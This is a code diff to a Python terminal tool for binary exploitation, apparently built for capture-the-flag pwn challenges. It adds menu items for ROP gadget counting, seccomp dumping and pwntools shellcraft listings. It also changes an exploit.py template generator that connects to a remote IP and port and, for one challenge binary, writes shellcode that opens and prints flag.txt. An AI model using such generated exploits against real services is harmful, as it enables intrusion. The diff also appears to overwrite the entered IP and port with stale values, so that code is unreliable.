@@ -249,21 +249,21 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) Find   Gadgets (41) MSF PatternCreate (51) HexCode Editor" + '\u2551',end=' ')
+   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) Find   Gadgets (41) MSF PatternCreate (51) Hexcode Editor" + '\u2551',end=' ')
    if "main" in FUNC[13]:
       print(colored(FUNC[13],colour3), end=' ')
    else:
       print(colored(FUNC[13],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) GOTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecComp  Tools" + '\u2551',end=' ')
+   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) GOTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecCompProgram" + '\u2551',end=' ')
    if "main" in FUNC[14]:
       print(colored(FUNC[14],colour3), end=' ')
    else:
       print(colored(FUNC[14],colour6), end=' ')     
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI ;    RET (33) Read  Sections (43) L-Trace Interface (53)               " + '\u2551',end=' ')
+   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI ;    RET (33) Read  Sections (43) L-Trace Interface (53) MOD ShellCraft" + '\u2551',end=' ')
    if "main" in FUNC[15]:
       print(colored(FUNC[15],colour3), end=' ')
    else:
@@ -277,14 +277,14 @@ def options():
       print(colored(FUNC[16],colour6), end=' ')
    print('\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(05) SOURCE INDEX (15) OVERWRITE ADDR (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF Shellcode " + '\u2551',end=' ')
+   print('\u2551' + "(05) SOURCE INDEX (15) OVERWRITE ADDR (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF  Shellcode" + '\u2551',end=' ')
    if "main" in FUNC[17]:
       print(colored(FUNC[17],colour3), end=' ')
    else:
       print(colored(FUNC[17],colour6), end=' ')     
    print('\u2551')
    # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
-   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY CONTENT (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56) Shellcraft    " + '\u2551',end=' ')
+   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY CONTENT (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56)               " + '\u2551',end=' ')
    if "main" in FUNC[18]:
       print(colored(FUNC[18],colour3), end=' ')
    else:
@@ -467,9 +467,9 @@ HED3[5]  = "BITS   "
 HED3[6]  = "INDIAN "
 HED3[7]  = "LIBC   "
 HED3[8]  = "<======"
-HED3[9]  = "I.P.   "
-HED3[10] = "PORT   "
-HED3[11] = "       "
+HED3[9]  = "GADGETS"
+HED3[10] = "I.P.   "
+HED3[11] = "PORT   "
 
 HED4[0]  = "RELRO  "
 HED4[1]  = "STACK  "
@@ -492,7 +492,7 @@ DATA[7]  = spacePadding("unknown", COL1)
 DATA[8]  = "="*COL1
 DATA[9]  = spacePadding("0", COL1)
 DATA[10] = spacePadding("0", COL1)
-DATA[11] = spacePadding(" ", COL1)
+DATA[11] = spacePadding("0", COL1)
 
 CSEC[0]  = spacePadding("unknown", COL1)
 CSEC[1]  = spacePadding("unknown", COL1)
@@ -1472,6 +1472,10 @@ while True:
       else:      
          print(colored("[*] Examining file " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
          command("ROPgadget --binary " + localDir + "/" + DATA[0].rstrip(" ") + " > gadgets.tmp")
+         command("cat gadgets.tmp | awk 'END{print}' > count.tmp")
+         gadgets = linecache.getline("count.tmp", 1)
+         gadgets = gadgets.split(" ")[3].rstrip("\n")
+         DATA[9] = spacePadding(gadgets, COL1)
          parsFile("gadgets.tmp")
          catsFile("gadgets.tmp")                
          command("cat gadgets.tmp | grep 'pop rdi ; ret' > pop.tmp")        
@@ -1865,7 +1869,10 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         command("seccomp-tools dump " + localDir + "/" + DATA[0])
+         if DATA[2][:6] == "static":
+            print("[-] File is curently set to static analysis...")
+         else:
+            command("seccomp-tools dump " + localDir + "/" + DATA[0])
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -1880,8 +1887,23 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         pass
-      prompt()  
+         if DATA[1][:3] == "elf":
+            command("shellcraft -l " + DATA[3].rstrip(" ") + "." + "linux > shellcraft.tmp")
+            parsFile("shellcraft.tmp")
+            catsFile("shellcraft.tmp")
+            code = input("[?] Enter value (ie. i386.linux.sh) for hex code: ")
+            command("echo '" + Green + "'")
+            command("shellcraft " + code + " --color")
+            command("echo '" + Reset + "'")
+         else:
+            command("shellcraft -l " + DATA[3].rstrip(" ") + "." + " > shellcraft.tmp")
+            parsFile("shellcraft.tmp")
+            catsFile("shellcraft.tmp")
+            code = input("[?] Enter value (ie. i386.linux.sh) for hex code: ")
+            command("echo '" + Green + "'")
+            command("shellcraft " + code + " --color")
+            command("echo '" + Reset + "'")         
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1926,15 +1948,8 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         if DATA[1][:3] == "elf":
-            command("shellcraft -l " + DATA[3] + "." + "linux > shellcraft.tmp")
-            parsFile("shellcraft.tmp")
-            catsFile("shellcraft.tmp")
-            code = input("[?] Enter value (ie. i386.linux.sh) for hex code: ")
-            command("echo '" + Green + "'")
-            command("shellcraft " + code + " --color")
-            command("echo '" + Reset + "'")
-      prompt()
+         pass
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1948,10 +1963,10 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         DATA[9] = input("[?] Please enter remote IP address : ")
-         DATA[9] = spacePadding(DATA[9], COL1)
-         DATA[10] = input("[?] Please enter remote port number: ")
-         DATA[10] = spacePadding(DATA[10], COL1)
+         DATA[10] = input("[?] Please enter remote IP address : ")
+         DATA[10] = spacePadding(DATA[9], COL1)
+         DATA[11] = input("[?] Please enter remote port number: ")
+         DATA[11] = spacePadding(DATA[10], COL1)
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -2003,17 +2018,17 @@ while True:
          command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          
          if DATA[9][:1] == "0":
-            command("echo 'ip_address = \"0\"' >> " + localDir + "/exploit.py")          
+            command("echo 'ip = \"0\"' >> " + localDir + "/exploit.py")          
          else:
-            command("echo 'ip_address = \"" + DATA[9].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
+            command("echo 'ip = \"" + DATA[10].rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          if DATA[10][:1] == "0":
             command("echo 'port = 0' >> " + localDir + "/exploit.py")         
          else:
-            command("echo 'port = " + DATA[10].rstrip(" ") + "' >> " + localDir + "/exploit.py")
+            command("echo 'port = " + DATA[11].rstrip(" ") + "' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
                   
-         command("echo 'if ip_address != \"0\":' >> " + localDir + "/exploit.py")
-         command("echo '   s = remote(ip_address, port)' >> " + localDir + "/exploit.py")
+         command("echo 'if ip != \"0\":' >> " + localDir + "/exploit.py")
+         command("echo '   s = remote(ip, port)' >> " + localDir + "/exploit.py")
          command("echo 'else:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + DATA[0].rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py") # SPACER
@@ -2107,20 +2122,21 @@ while True:
             command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")     
             
          if DATA[0][:10] == "blacksmith":
-            command("echo 'payload  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
-            command("echo 'payload += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
-            command("echo 'payload += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
+            command("echo 'shellcode  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
+            command("echo 'shellcode += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
+            command("echo 'shellcode += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
 
             command("echo '' >> " + localDir + "/exploit.py") # SPACER            		
             command("echo 's.sendlineafter(\">\", \"1\")' >> " + localDir + "/exploit.py")
             command("echo 's.sendlineafter(\">\", \"2\")' >> " + localDir + "/exploit.py")           
-            command("echo 's.sendlineafter(\">\", flat(payload))' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\">\", flat(shellcode))' >> " + localDir + "/exploit.py")
 
             command("echo '' >> " + localDir + "/exploit.py") # SPACER 
             command("echo 's.recv()' >> " + localDir + "/exploit.py")
             command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
             command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
             command("echo 'exit(1)' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER            
             
 # ADD YOUR BESPOKE PAYLOAD HERE
          
@@ -2129,6 +2145,7 @@ while True:
          command("echo '# s.close()' >> " + localDir + "/exploit.py")
          
          print(colored("[*] Python exploit template sucessfully created...", colour3))
+         catsFile(localDir + "/exploit.py")
       prompt()                       
 
 # ------------------------------------------------------------------------------------- 
